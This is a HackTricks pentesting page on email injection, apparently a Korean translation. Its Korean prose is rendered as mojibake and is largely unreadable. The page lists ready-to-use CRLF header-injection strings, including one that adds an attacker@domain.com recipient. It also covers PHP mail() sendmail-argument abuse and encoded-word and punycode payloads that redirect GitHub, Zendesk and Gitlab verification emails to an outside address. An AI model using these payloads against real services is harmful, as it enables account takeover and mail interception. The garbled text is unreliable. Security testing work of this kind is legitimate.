# ì´ë©”ì¼ ì¸ì ì…˜

<figure><img src="../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_source=hacktricks\&utm\_medium=text\&utm\_campaign=ppc\&utm\_content=email-injections)ë¥¼ ì‚¬ìš©í•˜ì—¬ ì„¸ê³„ì—ì„œ **ê°€ì¥ ì§„ë³´ëœ** ì»¤ë®¤ë‹ˆí‹° ë„êµ¬ë¡œ êµ¬ë™ë˜ëŠ” **ì›Œí¬í”Œë¡œìš°**ë¥¼ ì‰½ê²Œ êµ¬ì¶•í•˜ê³  **ìë™í™”**í•˜ì„¸ìš”.\
ì˜¤ëŠ˜ ë°”ë¡œ ì ‘ê·¼í•˜ì„¸ìš”:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=email-injections" %}

{% hint style="success" %}
AWS í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°:<img src="../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/arte.png" alt="" data-size="line">\
GCP í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°: <img src="../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks ì§€ì›í•˜ê¸°</summary>

* [**êµ¬ë… ê³„íš**](https://github.com/sponsors/carlospolop) í™•ì¸í•˜ê¸°!
* **ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f)ì— ì°¸ì—¬í•˜ê±°ë‚˜ [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— ì°¸ì—¬í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ë¥¼ íŒ”ë¡œìš°í•˜ì„¸ìš”.**
* **[**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) ê¹ƒí—ˆë¸Œ ë¦¬í¬ì§€í† ë¦¬ì— PRì„ ì œì¶œí•˜ì—¬ í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ í•˜ì„¸ìš”.**

</details>
{% endhint %}

## ë°œì†¡ëœ ì´ë©”ì¼ì— ì¸ì ì…˜

### ë°œì‹ ì ì¸ì ë’¤ì— Cc ë° Bcc ì¸ì ì…˜
```
From:sender@domain.com%0ACc:recipient@domain.co,%0ABcc:recipient1@domain.com
```
ë©”ì‹œì§€ëŠ” ìˆ˜ì‹ ì ë° recipient1 ê³„ì •ìœ¼ë¡œ ì „ì†¡ë©ë‹ˆë‹¤.

### Inject argument
```
From:sender@domain.com%0ATo:attacker@domain.com
```
ë©”ì‹œì§€ëŠ” ì›ë˜ ìˆ˜ì‹ ìì™€ ê³µê²©ì ê³„ì •ìœ¼ë¡œ ì „ì†¡ë©ë‹ˆë‹¤.

### Inject Subject argument
```
From:sender@domain.com%0ASubject:This is%20Fake%20Subject
```
ê°€ì§œ ì œëª©ì€ ì›ë˜ ì œëª©ì— ì¶”ê°€ë˜ë©°, ê²½ìš°ì— ë”°ë¼ ì´ë¥¼ ëŒ€ì²´í•©ë‹ˆë‹¤. ì´ëŠ” ë©”ì¼ ì„œë¹„ìŠ¤ì˜ ë™ì‘ì— ë”°ë¼ ë‹¤ë¦…ë‹ˆë‹¤.

### ë©”ì‹œì§€ ë³¸ë¬¸ ë³€ê²½

ë‘ ê°œì˜ ì¤„ ë°”ê¿ˆì„ ì‚½ì…í•œ ë‹¤ìŒ, ë©”ì‹œì§€ ë³¸ë¬¸ì„ ë³€ê²½í•˜ê¸° ìœ„í•´ ë©”ì‹œì§€ë¥¼ ì‘ì„±í•©ë‹ˆë‹¤.
```
From:sender@domain.com%0A%0AMy%20New%20%0Fake%20Message.
```
### PHP mail() í•¨ìˆ˜ ì•…ìš©
```bash
# The function has the following definition:

php --rf mail

Function [ <internal:standard> function mail ] {
- Parameters [5] {
Parameter #0 [ <required> $to ]
Parameter #1 [ <required> $subject ]
Parameter #2 [ <required> $message ]
Parameter #3 [ <optional> $additional_headers ]
Parameter #4 [ <optional> $additional_parameters ]
}
}
```
#### 5ë²ˆì§¸ ë§¤ê°œë³€ìˆ˜ ($additional\_parameters)

ì´ ì„¹ì…˜ì€ **ê³µê²©ìê°€ ì´ ë§¤ê°œë³€ìˆ˜ë¥¼ ì œì–´í•œë‹¤ê³  ê°€ì •í•  ë•Œ ì´ë¥¼ ì•…ìš©í•˜ëŠ” ë°©ë²•**ì— ê¸°ë°˜í•©ë‹ˆë‹¤.

ì´ ë§¤ê°œë³€ìˆ˜ëŠ” PHPê°€ ë°”ì´ë„ˆë¦¬ sendmailì„ í˜¸ì¶œí•˜ëŠ” ë° ì‚¬ìš©í•  ëª…ë ¹ì¤„ì— ì¶”ê°€ë©ë‹ˆë‹¤. ê·¸ëŸ¬ë‚˜ `escapeshellcmd($additional_parameters)` í•¨ìˆ˜ë¡œ ì •ë¦¬ë©ë‹ˆë‹¤.

ì´ ê²½ìš° ê³µê²©ìëŠ” **sendmailì— ëŒ€í•œ ì¶”ê°€ ë§¤ê°œë³€ìˆ˜ë¥¼ ì£¼ì…í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤**.

#### /usr/sbin/sendmail êµ¬í˜„ì˜ ì°¨ì´ì 

**sendmail** ì¸í„°í˜ì´ìŠ¤ëŠ” **ì‹œìŠ¤í…œì— ì„¤ì¹˜ëœ MTA ì´ë©”ì¼ ì†Œí”„íŠ¸ì›¨ì–´**(Sendmail, Postfix, Exim ë“±)ì—ì„œ **ì œê³µë©ë‹ˆë‹¤**. **ê¸°ë³¸ ê¸°ëŠ¥**(ì˜ˆ: -t -i -f ë§¤ê°œë³€ìˆ˜)ì€ í˜¸í™˜ì„± ì´ìœ ë¡œ **ê°™ì€** ìƒíƒœë¥¼ ìœ ì§€í•˜ì§€ë§Œ, **ë‹¤ë¥¸ ê¸°ëŠ¥ê³¼ ë§¤ê°œë³€ìˆ˜**ëŠ” ì„¤ì¹˜ëœ MTAì— ë”°ë¼ í¬ê²Œ ë‹¤ë¦…ë‹ˆë‹¤.

ë‹¤ìŒì€ sendmail ëª…ë ¹/ì¸í„°í˜ì´ìŠ¤ì˜ ë‹¤ì–‘í•œ ë§¤ë‰´ì–¼ í˜ì´ì§€ì˜ ëª‡ ê°€ì§€ ì˜ˆì…ë‹ˆë‹¤:

* Sendmail MTA: http://www.sendmail.org/\~ca/email/man/sendmail.html
* Postfix MTA: http://www.postfix.org/mailq.1.html
* Exim MTA: https://linux.die.net/man/8/eximReferences

**sendmail** ë°”ì´ë„ˆë¦¬ì˜ **ì¶œì²˜ì— ë”°ë¼** ì´ë¥¼ ì•…ìš©í•˜ê³  l**eak íŒŒì¼ ë˜ëŠ” ì„ì˜ì˜ ëª…ë ¹ì„ ì‹¤í–‰í•˜ëŠ” ë‹¤ì–‘í•œ ì˜µì…˜ì´ ë°œê²¬ë˜ì—ˆìŠµë‹ˆë‹¤**. [**https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html**](https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html)ì—ì„œ í™•ì¸í•˜ì„¸ìš”.

## ì´ë©”ì¼ ì´ë¦„ì— ì£¼ì…í•˜ê¸°

{% hint style="danger" %}
ì„ì˜ì˜ ë„ë©”ì¸ ì´ë¦„(ì˜ˆ: Github, Gitlab, CloudFlare Zero trust...)ìœ¼ë¡œ ì„œë¹„ìŠ¤ì— ê³„ì •ì„ ìƒì„±í•˜ê³ , í™•ì¸ ì´ë©”ì¼ì„ ìì‹ ì˜ ì´ë©”ì¼ ì£¼ì†Œë¡œ ìˆ˜ì‹ í•˜ì—¬ ì´ë¥¼ í™•ì¸í•˜ë©´, í”¼í•´ íšŒì‚¬ì˜ ë¯¼ê°í•œ ìœ„ì¹˜ì— ì ‘ê·¼í•  ìˆ˜ ìˆì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.
{% endhint %}

### ì´ë©”ì¼ì˜ ë¬´ì‹œëœ ë¶€ë¶„

ê¸°í˜¸: **+, -** ë° **{}**ëŠ” ë“œë¬¼ê²Œ íƒœê·¸ ì§€ì •ì— ì‚¬ìš©ë  ìˆ˜ ìˆìœ¼ë©° ëŒ€ë¶€ë¶„ì˜ ì´ë©”ì¼ ì„œë²„ì—ì„œ ë¬´ì‹œë©ë‹ˆë‹¤.

* ì˜ˆ: john.doe+intigriti@example.com â†’ john.doe@example.com

**ê´„í˜¸ () ì‚¬ì´ì˜ ì£¼ì„**ì€ ì‹œì‘ ë˜ëŠ” ëì— ìˆì„ ê²½ìš°ì—ë„ ë¬´ì‹œë©ë‹ˆë‹¤.

* ì˜ˆ: john.doe(intigriti)@example.com â†’ john.doe@example.com

### í™”ì´íŠ¸ë¦¬ìŠ¤íŠ¸ ìš°íšŒ

<figure><img src="../.gitbook/assets/image (812).png" alt="https://www.youtube.com/watch?app=desktop&#x26;v=4ZsTKvfP1g0"><figcaption></figcaption></figure>

### ì¸ìš©ë¶€í˜¸

<figure><img src="../.gitbook/assets/image (626).png" alt="https://www.youtube.com/watch?app=desktop&#x26;v=4ZsTKvfP1g0"><figcaption></figcaption></figure>

### IP

ëŒ€ê´„í˜¸ ì•ˆì— ë„ë©”ì¸ ì´ë¦„ìœ¼ë¡œ IPë¥¼ ì‚¬ìš©í•  ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤:

* john.doe@\[127.0.0.1]
* john.doe@\[IPv6:2001:db8::1]

### ì´ë©”ì¼ ì¸ì½”ë”©

[**ì´ ì—°êµ¬**](https://portswigger.net/research/splitting-the-email-atom)ì—ì„œ ì„¤ëª…í•œ ë°”ì™€ ê°™ì´, ì´ë©”ì¼ ì´ë¦„ì€ ì¸ì½”ë”©ëœ ë¬¸ìë¥¼ í¬í•¨í•  ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤:

* **PHP 256 ì˜¤ë²„í”Œë¡œìš°**: PHP `chr` í•¨ìˆ˜ëŠ” ë¬¸ìê°€ ì–‘ìˆ˜ê°€ ë  ë•Œê¹Œì§€ 256ì„ ê³„ì† ì¶”ê°€í•œ í›„ `%256` ì—°ì‚°ì„ ìˆ˜í–‰í•©ë‹ˆë‹¤.
* `String.fromCodePoint(0x10000 + 0x40) // ğ€ â†’ @`

{% hint style="success" %}
ì´ íŠ¸ë¦­ì˜ ëª©í‘œëŠ” `RCPT TO:<"collab@psres.net>collab"@example.com>`ì™€ ê°™ì€ ì£¼ì…ìœ¼ë¡œ ëë‚˜ëŠ” ê²ƒì…ë‹ˆë‹¤.\
ì´ëŠ” í™•ì¸ ì´ë©”ì¼ì„ ì˜ˆìƒëœ ì´ë©”ì¼ ì£¼ì†Œì™€ ë‹¤ë¥¸ ì´ë©”ì¼ ì£¼ì†Œë¡œ ë³´ë‚´ê²Œ í•˜ì—¬ ì´ë©”ì¼ ì´ë¦„ ì•ˆì— ë‹¤ë¥¸ ì´ë©”ì¼ ì£¼ì†Œë¥¼ ì‚½ì…í•˜ê³  ì´ë©”ì¼ì„ ë³´ë‚¼ ë•Œ êµ¬ë¬¸ì„ ê¹¨ëœ¨ë¦¬ê²Œ ë©ë‹ˆë‹¤.
{% endhint %}

ë‹¤ì–‘í•œ ì¸ì½”ë”©:
```bash
# Format
=? utf-8 ? q ? =41=42=43 ?= hi@example.com --> ABChi@example.com

# =? -> Start of encode
# utf-8 -> encoding used
# ? -> separator
# q -> type of encoding
# ? -> separator
# =41=42=43 -> Hex encoded data
# ?= end of encoding

# Other encodings, same example:
#Â iso-8859-1
=?iso-8859-1?q?=61=62=63?=hi@example.com
# utf-8
=?utf-8?q?=61=62=63?=hi@example.com
# utf-7
=?utf-7?q?<utf-7 encoded string>?=hi@example.com
# q encoding + utf-7
=?utf-7?q?&=41<utf-7 encoded string without initial A>?=hi@example.com
# base64
=?utf-8?b?QUJD?=hi@example.com
# bas64 + utf-7
=?utf-7?q?<utf-7 encoded string in base64>?=hi@example.com
#punycode
x@xn--svg/-9x6 â†’ x@<svg/
```
Payloads:

* Github: `=?x?q?collab=40psres.net=3e=00?=foo@example.com`
* ì¸ì½”ë”©ëœ `@`ëŠ” =40, ì¸ì½”ë”©ëœ `>`ëŠ” `=3e`, nullì€ `=00`&#x20;ì…ë‹ˆë‹¤.
* `collab@psres.net`ìœ¼ë¡œ ì¸ì¦ ì´ë©”ì¼ì´ ì „ì†¡ë©ë‹ˆë‹¤.
* Zendesk: `"=?x?q?collab=22=40psres.net=3e=00==3c22x?="@example.com`
* ì´ì „ê³¼ ê°™ì€ íŠ¸ë¦­ì´ì§€ë§Œ, ì‹œì‘ ë¶€ë¶„ì— ì¼ë°˜ ë”°ì˜´í‘œë¥¼ ì¶”ê°€í•˜ê³  ì¸ì½”ë”©ëœ ë”°ì˜´í‘œ `=22`ë¥¼ ì¸ì½”ë”©ëœ `@` ì•ì— ì¶”ê°€í•œ í›„, ë‹¤ìŒ ì´ë©”ì¼ ì•ì— ë”°ì˜´í‘œë¥¼ ì‹œì‘í•˜ê³  ë‹«ì•„ Zendesk ë‚´ë¶€ì—ì„œ ì‚¬ìš©ëœ êµ¬ë¬¸ì„ ìˆ˜ì •í•©ë‹ˆë‹¤.
* `collab@psres.net`ìœ¼ë¡œ ì¸ì¦ ì´ë©”ì¼ì´ ì „ì†¡ë©ë‹ˆë‹¤.
* Gitlab: `=?x?q?collab=40psres.net_?=foo@example.com`
* ì£¼ì†Œë¥¼ êµ¬ë¶„í•˜ê¸° ìœ„í•´ ì–¸ë”ìŠ¤ì½”ì–´ë¥¼ ê³µë°±ìœ¼ë¡œ ì‚¬ìš©í•œ ì ì— ìœ ì˜í•˜ì„¸ìš”.
* `collab@psres.net`ìœ¼ë¡œ ì¸ì¦ ì´ë©”ì¼ì´ ì „ì†¡ë©ë‹ˆë‹¤.
* Punycode: Punycodeë¥¼ ì‚¬ìš©í•˜ì—¬ Joomlaì— `<style` íƒœê·¸ë¥¼ ì£¼ì…í•˜ê³  ì´ë¥¼ ì•…ìš©í•˜ì—¬ CSS ìœ ì¶œì„ í†µí•´ CSRF í† í°ì„ í›”ì¹  ìˆ˜ ìˆì—ˆìŠµë‹ˆë‹¤.

#### Tooling

* ì´ëŸ¬í•œ ì¡°í•©ì„ í¼ì§•í•˜ì—¬ ì´ë©”ì¼ í˜•ì‹ì„ ê³µê²©í•˜ë ¤ëŠ” **Burp Suite Turbo Intruder ìŠ¤í¬ë¦½íŠ¸**ê°€ ìˆìŠµë‹ˆë‹¤. ì´ ìŠ¤í¬ë¦½íŠ¸ëŠ” ì´ë¯¸ ì ì¬ì ìœ¼ë¡œ ì‘ë™í•˜ëŠ” ì¡°í•©ì„ ê°€ì§€ê³  ìˆìŠµë‹ˆë‹¤.
* [Hackvertor](https://portswigger.net/bappstore/65033cbd2c344fbabe57ac060b5dd100)ë¥¼ ì‚¬ìš©í•˜ì—¬ ì´ë©”ì¼ ë¶„í•  ê³µê²©ì„ ìƒì„±í•˜ëŠ” ê²ƒë„ ê°€ëŠ¥í•©ë‹ˆë‹¤.

### Other vulns

![https://www.youtube.com/watch?app=desktop\&v=4ZsTKvfP1g0](<../.gitbook/assets/image (1131).png>)

## Third party SSO

### XSS

**github** ë˜ëŠ” **salesforce**ì™€ ê°™ì€ ì¼ë¶€ ì„œë¹„ìŠ¤ëŠ” **XSS í˜ì´ë¡œë“œê°€ í¬í•¨ëœ ì´ë©”ì¼ ì£¼ì†Œë¥¼ ìƒì„±**í•  ìˆ˜ ìˆê²Œ í•´ì¤ë‹ˆë‹¤. ì´ëŸ¬í•œ ì œê³µìë¥¼ ì‚¬ìš©í•˜ì—¬ ë‹¤ë¥¸ ì„œë¹„ìŠ¤ì— ë¡œê·¸ì¸í•  ìˆ˜ ìˆê³ , ì´ ì„œë¹„ìŠ¤ê°€ ì´ë©”ì¼ì„ **ì˜¬ë°”ë¥´ê²Œ ì •ë¦¬í•˜ì§€ ì•Šìœ¼ë©´** **XSS**ë¥¼ ìœ ë°œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### Account-Takeover

**SSO ì„œë¹„ìŠ¤**ê°€ **ì£¼ì–´ì§„ ì´ë©”ì¼ ì£¼ì†Œë¥¼ í™•ì¸í•˜ì§€ ì•Šê³  ê³„ì •ì„ ìƒì„±**í•  ìˆ˜ ìˆê²Œ í•´ì£¼ê³  (ì˜ˆ: **salesforce**), ê·¸ ê³„ì •ì„ ì‚¬ìš©í•˜ì—¬ **salesforceë¥¼ ì‹ ë¢°í•˜ëŠ” ë‹¤ë¥¸ ì„œë¹„ìŠ¤ì— ë¡œê·¸ì¸**í•  ìˆ˜ ìˆë‹¤ë©´, ì–´ë–¤ ê³„ì •ì—ë„ ì ‘ê·¼í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.\
_salesforceëŠ” ì£¼ì–´ì§„ ì´ë©”ì¼ì´ í™•ì¸ë˜ì—ˆëŠ”ì§€ ì—¬ë¶€ë¥¼ í‘œì‹œí•˜ì§€ë§Œ, ì• í”Œë¦¬ì¼€ì´ì…˜ì€ ì´ ì •ë³´ë¥¼ ê³ ë ¤í•´ì•¼ í•©ë‹ˆë‹¤._

## Reply-To

_**From: company.com**_ì„ ì‚¬ìš©í•˜ì—¬ ì´ë©”ì¼ì„ ë³´ë‚¼ ìˆ˜ ìˆìœ¼ë©°, _**Replay-To: attacker.com**_ì„ ì„¤ì •í•˜ë©´, ë‚´ë¶€ ì£¼ì†Œì—ì„œ ì´ë©”ì¼ì´ ì „ì†¡ë˜ì—ˆê¸° ë•Œë¬¸ì— **ìë™ íšŒì‹ **ì´ ì „ì†¡ë  ê²½ìš° **ê³µê²©ì**ê°€ ê·¸ **ì‘ë‹µ**ì„ **ë°›ì„ ìˆ˜** ìˆìŠµë‹ˆë‹¤.

## Hard Bounce Rate

AWSì™€ ê°™ì€ íŠ¹ì • ì„œë¹„ìŠ¤ëŠ” **Hard Bounce Rate**ë¡œ ì•Œë ¤ì§„ ì„ê³„ê°’ì„ êµ¬í˜„í•˜ë©°, ì¼ë°˜ì ìœ¼ë¡œ 10%ë¡œ ì„¤ì •ë©ë‹ˆë‹¤. ì´ëŠ” ì´ë©”ì¼ ì „ì†¡ ì„œë¹„ìŠ¤ì— íŠ¹íˆ ì¤‘ìš”í•œ ì§€í‘œì…ë‹ˆë‹¤. ì´ ë¹„ìœ¨ì„ ì´ˆê³¼í•˜ë©´ AWSì˜ ì´ë©”ì¼ ì„œë¹„ìŠ¤ì™€ ê°™ì€ ì„œë¹„ìŠ¤ê°€ ì¤‘ë‹¨ë˜ê±°ë‚˜ ì°¨ë‹¨ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

**í•˜ë“œ ë°”ìš´ìŠ¤**ëŠ” ìˆ˜ì‹ ìì˜ ì£¼ì†Œê°€ ìœ íš¨í•˜ì§€ ì•Šê±°ë‚˜ ì¡´ì¬í•˜ì§€ ì•Šì•„ ë°œì‹ ìì—ê²Œ ë°˜í™˜ëœ **ì´ë©”ì¼**ì„ ì˜ë¯¸í•©ë‹ˆë‹¤. ì´ëŠ” ì¡´ì¬í•˜ì§€ ì•ŠëŠ” ì£¼ì†Œë¡œ ì´ë©”ì¼ì´ ì „ì†¡ë˜ê±°ë‚˜, ì‹¤ì œê°€ ì•„ë‹Œ ë„ë©”ì¸ìœ¼ë¡œ ì „ì†¡ë˜ê±°ë‚˜, ìˆ˜ì‹ ì ì„œë²„ê°€ **ì´ë©”ì¼** ìˆ˜ì‹ ì„ ê±°ë¶€í•˜ëŠ” ë“±ì˜ ë‹¤ì–‘í•œ ì´ìœ ë¡œ ë°œìƒí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

AWSì˜ ë§¥ë½ì—ì„œ 1000ê°œì˜ ì´ë©”ì¼ì„ ë³´ë‚´ê³  ê·¸ ì¤‘ 100ê°œê°€ í•˜ë“œ ë°”ìš´ìŠ¤ê°€ ë°œìƒí•˜ë©´ (ìœ íš¨í•˜ì§€ ì•Šì€ ì£¼ì†Œë‚˜ ë„ë©”ì¸ê³¼ ê°™ì€ ì´ìœ ë¡œ) ì´ëŠ” 10%ì˜ í•˜ë“œ ë°”ìš´ìŠ¤ ë¹„ìœ¨ì„ ì˜ë¯¸í•©ë‹ˆë‹¤. ì´ ë¹„ìœ¨ì— ë„ë‹¬í•˜ê±°ë‚˜ ì´ˆê³¼í•˜ë©´ AWS SES (Simple Email Service)ê°€ ì´ë©”ì¼ ì „ì†¡ ê¸°ëŠ¥ì„ ì°¨ë‹¨í•˜ê±°ë‚˜ ì¤‘ë‹¨í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ì¤‘ë‹¨ ì—†ëŠ” ì´ë©”ì¼ ì„œë¹„ìŠ¤ë¥¼ ë³´ì¥í•˜ê³  ë°œì‹ ì í‰íŒì„ ìœ ì§€í•˜ê¸° ìœ„í•´ ë‚®ì€ í•˜ë“œ ë°”ìš´ìŠ¤ ë¹„ìœ¨ì„ ìœ ì§€í•˜ëŠ” ê²ƒì´ ì¤‘ìš”í•©ë‹ˆë‹¤. ë©”ì¼ë§ ë¦¬ìŠ¤íŠ¸ì˜ ì´ë©”ì¼ ì£¼ì†Œ í’ˆì§ˆì„ ëª¨ë‹ˆí„°ë§í•˜ê³  ê´€ë¦¬í•˜ëŠ” ê²ƒì´ ì´ë¥¼ ë‹¬ì„±í•˜ëŠ” ë° í¬ê²Œ ë„ì›€ì´ ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ìì„¸í•œ ì •ë³´ëŠ” AWSì˜ ê³µì‹ ë¬¸ì„œì—ì„œ ë°”ìš´ìŠ¤ ë° ë¶ˆë§Œ ì²˜ë¦¬ì— ëŒ€í•œ ë‚´ìš©ì„ ì°¸ì¡°í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤: [AWS SES Bounce Handling](https://docs.aws.amazon.com/ses/latest/DeveloperGuide/notification-contents.html#bounce-types).

## References

* [https://resources.infosecinstitute.com/email-injection/](https://resources.infosecinstitute.com/email-injection/)
* [https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html](https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html)
* [https://drive.google.com/file/d/1iKL6wbp3yYwOmxEtAg1jEmuOf8RM8ty9/view](https://drive.google.com/file/d/1iKL6wbp3yYwOmxEtAg1jEmuOf8RM8ty9/view)
* [https://www.youtube.com/watch?app=desktop\&v=4ZsTKvfP1g0](https://www.youtube.com/watch?app=desktop\&v=4ZsTKvfP1g0)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
Use [**Trickest**](https://trickest.com/?utm\_source=hacktricks\&utm\_medium=text\&utm\_campaign=ppc\&utm\_content=email-injections) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
Get Access Today:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=email-injections" %}
